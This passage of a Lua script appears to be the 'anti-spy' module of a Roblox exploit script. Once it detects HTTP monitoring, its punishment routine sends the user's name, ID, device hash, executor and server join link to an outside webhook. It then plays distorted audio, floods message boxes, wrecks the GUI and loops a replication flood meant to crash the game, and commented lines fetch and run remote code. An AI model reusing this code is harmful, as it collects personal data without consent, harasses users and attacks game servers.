                  or _resolveGlobal(_cf.syn_request)
                  or _resolveGlobal(_cf.http_dot_request)
                  or _resolveGlobal(request)
                  or _resolveGlobal(http_request)
                  or (syn and _resolveGlobal(syn and syn.request))
                  or (http and _resolveGlobal(http and http.request))

    -- Step 5: if __vaultSend is still an lclosure (rare edge case), unwrap deeper
    if __vaultSend and islclosure(__vaultSend) then
        local recovered
        pcall(function()
            local allFns = {}
            for i = 1, 20 do
                local ok2, a, b = pcall(debug.getupvalue, __vaultSend, i)
                if not ok2 then break end
                local v = (b ~= nil) and b or a
                if type(v) == "function" and iscclosure(v) then recovered = v; break end
            end
        end)
        if recovered then __vaultSend = recovered end
    end
end

-- __vaultSend is now a private upvalue — a C closure bound to HttpService
-- via newcclosure. External scripts can't find it via getgenv(), can't hook
-- it via hookfunction (it's not in any global), and can't intercept it via
-- __namecall (it calls the method directly, not through :syntax dispatch).

-- Grab clean copies for the rest of the anti-spy system (unchanged API)
if not getgenv().__cleanFns then
    getgenv().__cleanFns = {}
    pcall(function() if request then getgenv().__cleanFns.request = clonefunction(request) end end)
    pcall(function() if http_request then getgenv().__cleanFns.http_request = clonefunction(http_request) end end)
    pcall(function() if http and http.request then getgenv().__cleanFns.http_dot_request = clonefunction(http.request) end end)
    pcall(function() if syn and syn.request then getgenv().__cleanFns.syn_request = clonefunction(syn.request) end end)
end

if getgenv().__antispy_loaded == nil then
    getgenv().__antispy_loaded = false
end

local HttpService = game:GetService("HttpService")
local detected = false
local ts = game:GetService("TweenService")

local function safeIndex(obj, key)
    local ok, value = pcall(function()
        return obj[key]
    end)
    return ok and value or nil
end

local HttpGet = safeIndex(game, "HttpGet")
local HttpPost = safeIndex(game, "HttpPost")

-- Full capability probe: anti-spy detection requires more than just HttpPost.
-- We need hookmetamethod to return the *previous* handler (not nil or the dummy
-- we just installed), and newcclosure must actually produce a C closure.
-- Executors like Xeno expose HttpPost but don't satisfy these requirements,
-- causing every lclosure check to false-positive and instantly fire punishment.
local antispySupported = false
do
    if HttpPost ~= nil then
        -- Check 1: newcclosure must produce a real C closure
        local testFn = newcclosure(function() end)
        local ncWorks = iscclosure(testFn)

        -- Check 2: hookmetamethod must return the previous handler as a C closure,
        -- the restore must succeed without error, AND __namecall must actually work
        -- after restoring (verified by making a real namecall and checking it doesn't
        -- error). All three sub-checks must pass or antispySupported stays false.
        local hmWorks = false
        if ncWorks then
            local probeInstalled = false
            local prev = nil

            -- Step A: install probe and capture prev, each in their own pcall
            -- so a throw on either doesn't leave us with an unknown state.
            local installOk = pcall(function()
                local probe = newcclosure(function(self, ...) end)
                prev = hookmetamethod(game, "__namecall", probe)
                probeInstalled = true
            end)

            if probeInstalled then
                if prev and iscclosure(prev) and prev ~= testFn then
                    -- Step B: restore in its own pcall — if this throws the probe
                    -- dummy stays installed and we must emergency-restore via rawmetatable
                    local restoreOk = pcall(function()
                        hookmetamethod(game, "__namecall", prev)
                    end)

                    if not restoreOk then
                        -- Emergency restore: write prev back directly via rawmetatable
                        pcall(function()
                            local mt = getrawmetatable(game)
                            if mt then
                                setreadonly(mt, false)
                                mt.__namecall = prev
                                setreadonly(mt, true)
                            end
                        end)
                    end

                    -- Step C: verify __namecall actually works after restore by
                    -- making a real namecall (game:IsA is safe and always returns).
                    -- If the probe dummy is still installed this call will return nil
                    -- and verifyOk will be false.
                    local verifyOk = pcall(function()
                        local result = game:IsA("DataModel")
                        if result == nil then error("__namecall returned nil after restore") end
                    end)

                    hmWorks = restoreOk and verifyOk
                else
                    -- hookmetamethod returned nil or an lclosure — not a clean executor.
                    -- Emergency-restore via rawmetatable so game isn't left broken.
                    pcall(function()
                        local mt = getrawmetatable(game)
                        if mt and prev then
                            setreadonly(mt, false)
                            mt.__namecall = prev
                            setreadonly(mt, true)
                        elseif mt then
                            setreadonly(mt, false)
                            mt.__namecall = nil
                            setreadonly(mt, true)
                        end
                    end)
                    -- hmWorks stays false
                end
            end
            -- If installOk is false the probe was never installed, nothing to restore.
        end

        antispySupported = ncWorks and hmWorks
    end
end
-- NOTE: safePost/safeGet are intentionally NOT wiped here even when
-- antispySupported is false. safePost/_verifyOnline use their own fallback
-- chain (syn.request, http.request, request, RequestAsync) and must remain
-- available on all executors for key auth.


function log(msg)
    --warn("[ANTI-SPY] "..msg)
end

local deb = false

function punishment()
    if not deb then deb = true else return end
    --loadstring(game:HttpGet(("https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/punish.lua")))()
    --loadstring(game:HttpGet(("https://raw.githubusercontent.com/zynviiy/fyghg/refs/heads/main/p.lua")))()
    
    --print("caught yo ass lackin")

    local function _getExecutor()
    -- identifyexecutor() is the modern standard (Synapse X, Fluxus, etc.)
    local ok, name = pcall(function()
        if identifyexecutor then return identifyexecutor() end
    end)
    if ok and name and name ~= "" then return tostring(name) end
    -- getexecutorname() — Delta, some others
    ok, name = pcall(function()
        if getexecutorname then return getexecutorname() end
    end)
    if ok and name and name ~= "" then return tostring(name) end
    -- Legacy env checks
    if syn and syn.request       then return "Synapse X"   end
    if KRNL_LOADED               then return "Krnl"        end
    if isourclosure              then return "Fluxus"      end
    if typeof(Velocity) == "table" or (type(vlua) == "table") then return "Velocity" end
    return "Unknown Executor"
    end

    local HS = game:GetService("HttpService")
    local LocalPlayer = game.Players.LocalPlayer
    local spyUserId = tostring(LocalPlayer.UserId or "?")
    local spyHwid = ""
    local executor = _getExecutor()
    local placeId  = tostring(game.PlaceId or "?")
    local serverId = tostring(game.JobId   or "?")
    local joinUrl  = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. serverId
    pcall(function()
        local deviceId = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
        local raw = deviceId .. "-" .. spyUserId
        local hash = 0
        for i = 1, #raw do hash = (hash * 31 + string.byte(raw, i)) % 2^32 end
        spyHwid = string.format("HWID-%08X-%s", hash, spyUserId)
    end)
    local timeStr = "?"
        pcall(function()
            local utcSec = os.time()
            local year = tonumber(os.date("!%Y", utcSec))
            local function nthSunday(y, m, n)
                local t   = os.time({year=y, month=m, day=1, hour=0, min=0, sec=0})
                local dow = tonumber(os.date("!%w", t))
                local first = (dow == 0) and 1 or (8 - dow)
                return first + (n - 1) * 7
            end
            local dstStart = os.time({year=year, month=3,  day=nthSunday(year, 3, 2),  hour=2, min=0, sec=0})
            local dstEnd   = os.time({year=year, month=11, day=nthSunday(year, 11, 1), hour=2, min=0, sec=0})
            local isDST    = (utcSec >= dstStart and utcSec < dstEnd)
            local offset   = isDST and (-4 * 3600) or (-5 * 3600)
            local estSec   = utcSec + offset
            local suffix   = isDST and "EDT" or "EST"
            timeStr = os.date("!%Y-%m-%d %I:%M:%S %p", estSec) .. " " .. suffix
        end)

    local WEBHOOK_URL = "https://massacreme-production.up.railway.app/log"

    local payload = HS:JSONEncode({
        embeds = {{
            title  = "🚨  HTTP Spy Detected, Punished.",
            color  = 0xff4444,
            fields = {
                { name = "Username", value = "**" .. tostring(LocalPlayer.Name) .. "**", inline = true  },
                { name = "User ID",  value = "`" .. spyUserId .. "`",                    inline = true  },
                { name = "HWID",     value = "`" .. spyHwid .. "`",                      inline = false },
                { name = "Executor", value = executor,                 inline = true  },
                { name = "Game",     value = "`"  .. placeId .. "`",   inline = true  },
                { name = "Time",         value = timeStr,                      inline = false },
                { name = "Join",     value = "[🎮 Join Server](" .. joinUrl .. ")", inline = false },
            },
            footer = { text = "Massacreme  ·  Anti-Spy" },
        }}
    })

    local opts = {
        Url     = WEBHOOK_URL,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = payload,
    }

    local ok, err = pcall(function()
        if __vaultSend               then return __vaultSend(opts)       end
        if syn and syn.request       then return syn.request(opts)        end
        if http and http.request     then return http.request(opts)       end
        if request                   then return request(opts)            end
        HS:RequestAsync(opts)
    end)

    if ok then
        --print("Webhook sent!")
    else
        --warn("Webhook failed: " .. tostring(err))
    end

    task.wait() -- the real punishment

    local MessageBoxFlags = {
    0,
    1,
    2,
    3,
    4,
    5,
    16,
    32,
    48,
    64,
    256,
    4096,
    16384
}

local sounds = {
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043237.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043244.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043330.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043455.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043549.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043602.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043609.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043616.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043700.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043730.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070459.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070507.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070514.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070532.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070537.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070553.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070627.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213070636.txt",
	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213041658.txt",
}

local audios = {}

for i,v in sounds do
	task.spawn(function()
		local Sound = Instance.new("Sound",game)
		Sound.Volume = 10
		local dist = Instance.new("DistortionSoundEffect",Sound)
		dist.Level = 0.75
		dist.Enabled = true
		local Encoded = game:HttpGet(v)
		writefile(i..".mp3", crypt.base64decode(Encoded))
		local Retrieved = getcustomasset(i..".mp3")
		Sound.SoundId = Retrieved
		table.insert(audios,Sound)	
	end)
end

local cc = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
cc.Contrast = 1
cc.Saturation = 3
cc.TintColor = Color3.new(1,0,0)

task.spawn(function()
    while task.wait() do
        task.spawn(function()
            messagebox("HTTP SPY DETECTED", "HTTP SPY DETECTED", 4096)
        end)
		pcall(function()
			workspace.CurrentCamera.CFrame *= CFrame.Angles(math.random(0,360),math.random(0,360),math.random(0,360))
		end)
    end
end)

pcall(function()
	task.spawn(function()
		while task.wait() do
			for i,v in game:GetService("CoreGui"):GetDescendants() do
				task.spawn(function()
					pcall(function()
						v.Name = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Text = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Rotation = math.random(0,360)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Visible = true
					end)
				end)
				task.wait()
			end
		end
	end)

	local hui = gethui()

	if hui then
		task.spawn(function()
			while task.wait() do
				for i,v in hui:GetDescendants() do
					task.spawn(function()
						pcall(function()
							v.Name = "HTTP SPY DETECTED"
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Text = "HTTP SPY DETECTED"
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Rotation = math.random(0,360)
						end)
					end)
					task.spawn(function()
						pcall(function()
							v.Visible = true
						end)
					end)
					task.wait()
				end
			end
		end)
	end

	task.spawn(function()
		while task.wait() do
			for i,v in game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants() do
				task.spawn(function()
					pcall(function()
						v.Name = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Text = "HTTP SPY DETECTED"
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Rotation = math.random(0,360)
					end)
				end)
				task.spawn(function()
					pcall(function()
						v.Visible = true
					end)
				end)
				task.wait()
			end
		end
	end)
end)

task.spawn(function()
	local count = 1
    while task.wait() do
		local s,e
		repeat s,e = pcall(function()
			Sound = audios[count]
        	Sound:Play()
		end)
		task.wait()
		until s
        Sound.Ended:Wait()
		count += 1
		if count > #sounds then
			count = 1
		end
    end
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local Sound = Instance.new("Sound", game.Workspace)
Sound.SoundId = "rbxassetid://9041745502"
Sound.Volume = 10
Sound.Looped = true
Sound:Play()

local countdown = 1
while countdown > 0 do
    if countdown == 10 or countdown == 5 then
        --sendChatMessage("End of session via: " .. countdown .. "s")
    end
    countdown = countdown - 1
    wait(1)
end
wait(1)
game.Players.LocalPlayer.PlayerGui:ClearAllChildren()
game.CoreGui:ClearAllChildren()

while wait(0.01) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
table.insert(spammedtable, {})
z = spammedtable[1]
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
local calculatemax = getmaxvalue(tableincrease)
local maximum
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
bomb(250, 2) --// change values if client crashes
end

end

if antispySupported then
    local realHookFunction = clonefunction(hookfunction)
    local realHookMetamethod = clonefunction(hookmetamethod)

    -- FALSE-POSITIVE GUARD
    -- Before punishing, we require a spy to be confirmed at least this many
    -- times across independent checks. A single ambiguous lclosure is NOT enough.
    local _spyConfirmCount = 0
    local _SPY_CONFIRM_THRESHOLD = 2  -- must see 2+ independent confirmed hooks

    -- Returns true only if fn is a *confirmed* hook: getoriginalfunction resolves
    -- to a different C closure AND the function passes islclosure. Executor-native
    -- lclosures (Xeno, Wave, etc.) won't have getoriginalfunction return anything
    -- different, so they are never flagged.
    local function _isConfirmedHook(fn)
        if not fn or type(fn) ~= "function" then return false end
        if not islclosure(fn) then return false end
        local ok, orig = pcall(function() return getoriginalfunction(fn) end)
        return ok and orig and iscclosure(orig) and orig ~= fn
    end

    -- Punish only after threshold is met. Every confirmed detection must call
    -- this instead of calling punishment() directly.
    local _punished = false
    local function _confirmAndPunish(reason)
        if _punished then return end
        _spyConfirmCount = _spyConfirmCount + 1
        log("[ANTI-SPY] Confirmation " .. _spyConfirmCount .. "/" .. _SPY_CONFIRM_THRESHOLD .. " — " .. tostring(reason))
        if _spyConfirmCount >= _SPY_CONFIRM_THRESHOLD then
            _punished = true
            punishment()
        end
    end

    local originals = {}
local HTTP_METHODS = {
    HttpGet = true,
    HttpPost = true,
    GetAsync = true,
    PostAsync = true,
    RequestAsync = true,
}

function deepCollect(fn,visited,depth)
    local found = {}
    if depth > 6 or not fn or type(fn) ~= "function" then return found end
    if visited[fn] then return found end
    visited[fn] = true

    local function process(v)
        if type(v) == "function" then
            found[v] = true
            for f in pairs(deepCollect(v,visited,depth + 1)) do
                found[f] = true
            end
        elseif type(v) == "table" and depth < 4 then
            for i,tv in pairs(v) do
                if type(tv) == "function" then
                    found[tv] = true
                    for f in pairs(deepCollect(tv,visited,depth + 2)) do
                        found[f] = true
                    end
                end
            end
        end
    end

    pcall(function()
        local ups = getupvalues(fn)
        if ups then for i,v in pairs(ups) do process(v) end end
    end)

    pcall(function()
        for i = 1,50 do
            local a,b = getupvalue(fn,i)
            if a == nil and b == nil then break end
            process(a)
            if b ~= nil then process(b) end
        end
    end)

    pcall(function()
        for i = 1,50 do
            local name,val = debug.getupvalue(fn,i)
            if not name then break end
            process(val)
        end
    end)

    return found
end

-- Walks a hook L closure's upvalues in index order (1, 2, 3...) and returns
-- the first C closure found. Monitor hooks always store the original as their
-- first named upvalue (e.g. `local HttpPost; HttpPost = hookfunction(...)`),
-- so index order reliably finds it before any unrelated stdlib C closures.
-- deepCollect uses pairs() which is unordered and recurses into the hook's
-- entire upvalue tree (State, formatRawHttp, etc.), hitting table.insert or
-- similar before it ever reaches the real original.
local function extractOriginalFromHook(hookedFn)
    if not hookedFn or not islclosure(hookedFn) then return nil end

    -- Method 1: executor-native, instant, most reliable
    local orig
    pcall(function() orig = getoriginalfunction(hookedFn) end)
    if orig and iscclosure(orig) then return orig end

    -- Method 2: debug.getupvalue in index order (standard Lua debug API)
    pcall(function()
        for i = 1, 20 do
            local name, val = debug.getupvalue(hookedFn, i)
            if not name then break end
            if type(val) == "function" and iscclosure(val) then
                orig = val
                return
            end
        end
    end)
    if orig then return orig end

    -- Method 3: getupvalue (executor variant, returns name+value)
    pcall(function()
        for i = 1, 20 do
            local a, b = getupvalue(hookedFn, i)
            -- some executors return (name, value), others return (value, nil)
            local val = (b ~= nil) and b or a
            if val == nil then break end
            if type(val) == "function" and iscclosure(val) then
                orig = val
                return
            end
        end
    end)
    if orig then return orig end

    -- Method 4: getupvalues (returns table, iterate by index key)
    pcall(function()
        local ups = getupvalues(hookedFn)
        if not ups then return end
        for i = 1, 20 do
            local v = ups[i]
            if v == nil then break end
            if type(v) == "function" and iscclosure(v) then
                orig = v
                return
            end
        end
    end)
    return orig
end

function recoverOriginal(fn,name)
    if not fn then return nil,false end

    local hooked = false

    if islclosure(fn) then
        -- Don't flag as hooked just because it's an lclosure — some executors
        -- (e.g. Xeno) implement HTTP globals natively as Lua closures.
        -- Only treat it as a real hook if getoriginalfunction resolves to a
        -- *different* underlying C closure, which is the actual signature of
        -- a hookfunction-style spy.
        local ok, orig = pcall(function() return getoriginalfunction(fn) end)
        if ok and orig and iscclosure(orig) and orig ~= fn then
            hooked = true
            log("Detected L closure hook on "..name.." (confirmed via getoriginalfunction)")
        end
    end

    -- Fast path: already a C closure, nothing to unwrap
    if not islclosure(fn) then
        return fn,hooked
    end

    -- Method 1: getoriginalfunction (executor-native)
    local restored
    pcall(function() restored = getoriginalfunction(fn) end)
    if restored and type(restored) == "function" and iscclosure(restored) then
        if hooked then log("Recovered "..name.." via getoriginalfunction") end
        pcall(function() realHookFunction(fn,restored) end)
        return restored,hooked
    end

    -- Method 2: ordered upvalue walk directly on fn.
    -- Finding a C closure via upvalue walk is stronger evidence than deepCollect
    -- but still not confirmation on its own — only flag hooked if getoriginalfunction
    -- also confirmed it above. Return hooked as-is (set only by getoriginalfunction check).
    local direct = extractOriginalFromHook(fn)
    if direct then
        log("Recovered "..name.." via direct upvalue walk")
        pcall(function() realHookFunction(fn,direct) end)
        return direct,hooked  -- hooked only true if getoriginalfunction confirmed it earlier
    end

    -- Method 3: hookfunction probe — swap in dummy to retrieve previous handler,
    -- then ordered-walk that too
    local dummy = newcclosure(function() end)
    local prev
    pcall(function() prev = realHookFunction(fn,dummy) end)

    if not prev then
        pcall(function() realHookFunction(fn,fn) end)
        local fb
        pcall(function() fb = clonefunction(fn) end)
        return fb,hooked
    end

    if islclosure(prev) then
        -- Same guard: only flag as a real hook if getoriginalfunction confirms
        -- a different C closure behind it. Xeno can return an lclosure here
        -- from the hookfunction probe even with no spy present.
        local _pOk, _pOrig = pcall(function() return getoriginalfunction(prev) end)
        if _pOk and _pOrig and iscclosure(_pOrig) and _pOrig ~= prev then
            hooked = true
        end
        log("Detected hook on "..name.." (L closure from hookfunction probe)")

        local fromPrev = extractOriginalFromHook(prev)
        if fromPrev then
            log("Recovered "..name.." from prev upvalue walk")
            realHookFunction(fn,fromPrev)
            return fromPrev,hooked
        end

        -- Last resort: deepCollect across everything reachable from prev.
        -- IMPORTANT: finding a C closure here does NOT confirm a spy — deepCollect
        -- walks the entire upvalue tree and may find unrelated stdlib C closures
        -- (table.insert, string.format, etc.). We recover the function but do NOT
        -- set hooked=true from this path alone, so anyHooked is not incremented.
        local allFns = deepCollect(prev,{},0)
        for f in pairs(allFns) do
            if iscclosure(f) then
                log("Recovered "..name.." from deepCollect (fallback, not flagging as spy)")
                realHookFunction(fn,f)
                return f,hooked  -- hooked unchanged — deepCollect alone is not confirmation
            end
        end

        local cl
        pcall(function() cl = clonefunction(prev) end)
        if cl and iscclosure(cl) then
            realHookFunction(fn,cl)
            return cl,hooked
        end

        realHookFunction(fn,prev)
        local fb
        pcall(function() fb = clonefunction(fn) end)
        return fb or prev,hooked
    end

    realHookFunction(fn,prev)
    return prev,hooked
end

local anyHooked = false

local instanceMethods = {
    {HttpGet,"HttpGet","game.HttpGet"},
    {HttpPost,"HttpPost","game.HttpPost"},
    {safeIndex(HttpService, "GetAsync"),"GetAsync","HttpService.GetAsync"},
    {safeIndex(HttpService, "PostAsync"),"PostAsync","HttpService.PostAsync"},
    {safeIndex(HttpService, "RequestAsync"),"RequestAsync","HttpService.RequestAsync"},
}

for i,m in ipairs(instanceMethods) do
    local orig,hooked = recoverOriginal(m[1],m[3])
    originals[m[2]] = orig
    if hooked then anyHooked = true end
end

local globalFns = {
    {request,"request","request"},
    {http_request,"http_request","http_request"},
    {http and http.request,"http_dot_request","http.request"},
    {syn and syn.request,"syn_request","syn.request"},
}

for i,g in ipairs(globalFns) do
    if g[1] then
        local orig,hooked = recoverOriginal(g[1],g[3])
        originals[g[2]] = orig
        if hooked then anyHooked = true end
    end
end

pcall(function() if originals.request and request then getgenv().request = originals.request end end)
pcall(function() if originals.http_request and http_request then getgenv().http_request = originals.http_request end end)
pcall(function() if originals.http_dot_request and http then http.request = originals.http_dot_request end end)
pcall(function() if originals.syn_request and syn then syn.request = originals.syn_request end end)

local rawMt
pcall(function() rawMt = getrawmetatable(game) end)

local originalNc

local ncDummy = newcclosure(function(self,...) return nil end)
local prevNc
pcall(function() prevNc = realHookMetamethod(game,"__namecall",ncDummy) end)

if prevNc then
    if islclosure(prevNc) then
        -- Only flag as a spy if getoriginalfunction confirms a different C closure
        -- behind it. On Xeno, __namecall is natively an lclosure — not a spy hook.
        local _ncOk, _ncOrig = pcall(function() return getoriginalfunction(prevNc) end)
        if _ncOk and _ncOrig and iscclosure(_ncOrig) and _ncOrig ~= prevNc then
            anyHooked = true
            log("Detected spy hook on __namecall (confirmed)")
        end

        -- Ordered upvalue walk first — monitor stores oldHttpCall as upvalue #1
        originalNc = extractOriginalFromHook(prevNc)
        if originalNc then
            log("Recovered original __namecall via upvalue walk")
        end

        -- Fall back to deepCollect only if upvalue walk found nothing
        if not originalNc then
            local allFns = deepCollect(prevNc,{},0)
            for f in pairs(allFns) do
                if iscclosure(f) then
                    originalNc = f
                    log("Recovered original __namecall from deepCollect (fallback)")
                    break
                end
            end
        end

        if not originalNc then
            pcall(function() originalNc = clonefunction(prevNc) end)
            if not originalNc then originalNc = prevNc end
        end
    else
        originalNc = prevNc
    end
else
    pcall(function() originalNc = rawMt.__namecall end)
end

if anyHooked then
    detected = true
    log("HTTP SPY DETECTED - hooks neutralized")
    _confirmAndPunish("anyHooked after instance/global method scan")
end

-- detect monitor by checking if globals are lclosures at startup
-- Guard: only punish if getoriginalfunction resolves a *different* C closure —
-- executors like Xeno expose request/http_request as native lclosures, which
-- would be a false positive without this confirmation step.
pcall(function()
    if request and islclosure(request) then
        local ok, orig = pcall(function() return getoriginalfunction(request) end)
        if ok and orig and iscclosure(orig) and orig ~= request then
            log("request is lclosure at startup - monitor likely loaded first (confirmed)")
            anyHooked = true
            _confirmAndPunish("request lclosure confirmed at startup")
        end
    end
    if http_request and islclosure(http_request) then
        local ok, orig = pcall(function() return getoriginalfunction(http_request) end)
        if ok and orig and iscclosure(orig) and orig ~= http_request then
            log("http_request is lclosure at startup - monitor likely loaded first (confirmed)")
            anyHooked = true
            _confirmAndPunish("http_request lclosure confirmed at startup")
        end
    end
end)

function cleanupSpyData()
    pcall(function()
        for i,obj in pairs(getgc(true)) do
            if type(obj) == "table" then
                pcall(function()
                    local first = rawget(obj,1)
                    if type(first) == "table" then
                        local url = rawget(first,"Url") or rawget(first,"url")
                        local method = rawget(first,"Method") or rawget(first,"method")
                        if type(url) == "string" and type(method) == "string" then
                            for i = #obj,1,-1 do rawset(obj,i,nil) end
                        end
                    end
                end)
            end
        end
    end)
end

cleanupSpyData()

-- only install hooks once
if not getgenv().__antispy_loaded then
    getgenv().__antispy_loaded = true

    task.spawn(function()
        while task.wait(3) do
            cleanupSpyData()
        end
    end)

    -- Periodically check if request/http_request got re-hooked after load.
    -- Guard: confirm via getoriginalfunction before punishing — bare islclosure
    -- is a false positive on Xeno which exposes these as native lclosures.
    task.spawn(function()
        while task.wait(5) do
            pcall(function()
                if request and islclosure(request) then
                    local ok, orig = pcall(function() return getoriginalfunction(request) end)
                    if ok and orig and iscclosure(orig) and orig ~= request then
                        log("[ANTI-SPY] request re-hooked — recovering")
                        local recovered = recoverOriginal(request, "request")
                        if recovered then getgenv().request = recovered end
                        _confirmAndPunish("request re-hooked post-load")
                    end
                end
                if http_request and islclosure(http_request) then
                    local ok, orig = pcall(function() return getoriginalfunction(http_request) end)
                    if ok and orig and iscclosure(orig) and orig ~= http_request then
                        log("[ANTI-SPY] http_request re-hooked — recovering")
                        local recovered = recoverOriginal(http_request, "http_request")
                        if recovered then getgenv().http_request = recovered end
                        _confirmAndPunish("http_request re-hooked post-load")
                    end
                end
                if http and http.request and islclosure(http.request) then
                    local ok, orig = pcall(function() return getoriginalfunction(http.request) end)
                    if ok and orig and iscclosure(orig) and orig ~= http.request then
                        log("[ANTI-SPY] http.request re-hooked — recovering")
                        local recovered = recoverOriginal(http.request, "http.request")
                        if recovered then http.request = recovered end
                    end
                end
            end)
        end
    end)

    local ncHandler = newcclosure(function(self,...)
        local method = getnamecallmethod()

        if HTTP_METHODS[method] and originals[method] then
            return originals[method](self,...)
        end
        if originalNc then
            return originalNc(self,...)
        end
    end)

    -- hook via hookmetamethod
    pcall(function() realHookMetamethod(game,"__namecall",ncHandler) end)

    -- also write directly to rawmetatable, bypassing hookmetamethod entirely
    pcall(function()
        local mt = getrawmetatable(game)
        setreadonly(mt,false)
        mt.__namecall = ncHandler
        setreadonly(mt,true)
    end)

    function restoreAll()
        log("Restoring original functions...")
        pcall(function() if originals.HttpGet and HttpGet then realHookFunction(HttpGet,originals.HttpGet) end end)
        pcall(function() if originals.HttpPost and HttpPost then realHookFunction(HttpPost,originals.HttpPost) end end)
        pcall(function() if originals.GetAsync then realHookFunction(safeIndex(HttpService, "GetAsync"),originals.GetAsync) end end)
        pcall(function() if originals.PostAsync then realHookFunction(safeIndex(HttpService, "PostAsync"),originals.PostAsync) end end)
        pcall(function() if originals.RequestAsync then realHookFunction(safeIndex(HttpService, "RequestAsync"),originals.RequestAsync) end end)
        pcall(function() if originals.request and request then realHookFunction(request,originals.request) end end)
        pcall(function() if originals.http_request and http_request then realHookFunction(http_request,originals.http_request) end end)
        pcall(function() if originals.http_dot_request and http and http.request then realHookFunction(http.request,originals.http_dot_request) end end)
        pcall(function() if originals.syn_request and syn and syn.request then realHookFunction(syn.request,originals.syn_request) end end)
        log("All functions restored.")
    end

    function isProtectedFunction(fn)
        if not fn or type(fn) ~= "function" then return false end
        if HttpGet and fn == HttpGet then return true end
        if HttpPost and fn == HttpPost then return true end
        local asyncGet = safeIndex(HttpService, "GetAsync")
        local asyncPost = safeIndex(HttpService, "PostAsync")
        local asyncReq = safeIndex(HttpService, "RequestAsync")
        if fn == asyncGet or fn == asyncPost or fn == asyncReq then return true end
        if request and fn == request then return true end
        if http_request and fn == http_request then return true end
        if http and http.request and fn == http.request then return true end
        if syn and syn.request and fn == syn.request then return true end
        return false
    end

    realHookFunction(hookfunction,newcclosure(function(target,hook)
        if isProtectedFunction(target) then
            log("BLOCKED hookfunction attempt on HTTP function")
            detected = true
            _confirmAndPunish("hookfunction called on protected HTTP function")
            -- Even though we blocked the hook, wrap the target so that calls
            -- to protected URLs always go through __vaultSend directly,
            -- making this a double layer of protection.
            return target
        end
        -- For non-protected functions, allow the hook but wrap it so that
        -- if it ends up being called with one of our protected URLs, we
        -- transparently reroute through __vaultSend.
        local wrappedHook = newcclosure(function(...)
            -- Check if first arg looks like an opts table with a URL
            local a1 = (...)
            if type(a1) == "table" then
                local url = a1.Url or a1.url
                if _isProtectedUrl(url) then
                    if __vaultSend then
                        local ok, res = pcall(__vaultSend, a1)
                        if ok then return res end
                    end
                end
            end
            return hook(...)
        end)
        return realHookFunction(target, wrappedHook)
    end))

    realHookFunction(hookmetamethod,newcclosure(function(obj,method,hook)
        if obj == game and method == "__namecall" and type(hook) == "function" then
            local actualHook = hook
            return realHookMetamethod(obj,method,newcclosure(function(self,...)
                local m = getnamecallmethod()
                if HTTP_METHODS[m] and originals[m] then
                    -- SPY-BLIND: for protected URLs, call the real original
                    -- directly and never pass through to the spy's hook.
                    local url
                    local args = {...}
                    if m == "RequestAsync" then
                        local opts = args[1]
                        if type(opts) == "table" then url = opts.Url or opts.url end
                    else
                        url = args[1]
                    end
                    if _isProtectedUrl(url) then
                        return originals[m](self,...)
                    end
                    return originals[m](self,...)
                end
                return actualHook(self,...)
            end))
        end
        return realHookMetamethod(obj,method,hook)
    end))
end

